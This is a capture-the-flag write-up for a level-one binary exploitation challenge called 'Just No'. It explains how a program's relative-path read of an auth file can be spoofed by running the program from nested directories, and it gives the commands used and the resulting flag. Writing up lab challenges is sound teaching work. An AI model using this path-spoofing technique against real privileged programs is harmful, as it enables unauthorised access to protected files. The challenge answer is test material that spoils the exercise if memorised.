# Binary Exploitation (Level 1): Just No
## Description: 
>A program at /problems/f49abea6827cafa20a035340d3812d09 has access to a flag
>but refuses to share it. Can you convince it otherwise?
## Solution:
After navigating to the directory for this challenge, I was able to find an auth
file with "no" in it and the source code for justno.c. So I went ahead and took
a look at the source code:
***
    FILE* authf = fopen("../../problems/f49abea6827cafa20a03
    5340d3812d09/auth","r");
    ...
    if (strcmp(auth,"no")!=0) {
      FILE* flagf;
      flagf = fopen("/problems/f49abea6827cafa20a035340d3812
      d09/flag","r");
      ...
    }
***
The program is opening a file according to a relative path. This means that the
path depends on the current working directory. So all we need to spoof an auth
file and trick the program into opening it. To do this I made 3 nested test
directories, the problem directory with the spoofed auth file, and then ran the
program from there. 
***
    $ cd ~/test/test/test/problems/f49abea6827cafa20a03534
    0d3812d09
    $ /problems/f49abea6827cafa20a03534270d3812d09/justno
    Oh. Well the auth file doesn't say no anymore so... Here's the flag:
    6882905ccde9eeceac01f98cb0260fc2
***
Therefore, flag is: `6882905ccde9eeceac01f98cb0260fc2`
